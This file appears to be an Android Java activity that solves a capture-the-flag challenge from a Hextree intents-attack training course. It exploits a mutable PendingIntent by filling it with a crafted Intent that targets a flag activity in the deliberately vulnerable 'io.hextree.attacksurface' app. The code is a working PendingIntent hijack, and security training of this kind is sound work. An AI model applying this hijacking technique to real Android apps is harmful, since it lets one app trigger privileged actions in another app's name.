package com.example.evilcorp.extraActivities;

import android.annotation.SuppressLint;
import android.app.PendingIntent;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import com.example.evilcorp.Hextree_IntentsActivity;
import com.example.evilcorp.R;

public class Chall23Activity extends AppCompatActivity {

    @SuppressLint("RestrictedApi")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_chall23);
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });

        // Back Button
        Button btn1 = findViewById(R.id.backfromChall23);
        btn1.setOnClickListener(new View.OnClickListener(){
            @Override
            public void onClick(View v) {
                Intent intent = new Intent(Chall23Activity.this, Hextree_IntentsActivity.class);
                startActivity(intent);
            }
        });

        //====================================================================
        //Start Challenge code
        //======================




        Intent incoming = getIntent();
        PendingIntent original = incoming.getParcelableExtra("pending_intent");

        if (original == null) {
            Toast.makeText(this, "No PendingIntent received", Toast.LENGTH_LONG).show();
            finish();
            return;
        }
        Intent evil = new Intent();
        evil.setClassName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag23Activity"
        );
        evil.setAction("io.hextree.attacksurface.GIVE_FLAG");
        evil.putExtra("code", 42);
        try {
            original.send(this, 0, evil);
            Toast.makeText(this, "PendingIntent hijacked", Toast.LENGTH_LONG).show();
        } catch (PendingIntent.CanceledException e) {
            System.out.println(e.toString());
        }
        finish();

    }
}